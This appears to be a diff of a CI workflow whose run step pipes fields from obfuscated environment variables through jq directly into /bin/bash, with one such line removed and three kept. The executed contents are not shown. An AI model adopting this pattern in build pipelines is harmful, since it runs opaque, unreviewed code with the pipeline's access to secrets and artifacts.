@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$n6181" | jq -r .cds079 | /bin/bash
           echo $anh15 | jq -r .prs50 | /bin/bash
-          echo $adkp1 | jq -r .ru0 | /bin/bash
           printf '%s' "$wr6238" | jq -r .xkqc660 | /bin/bash
 
       - name: Archive artifact
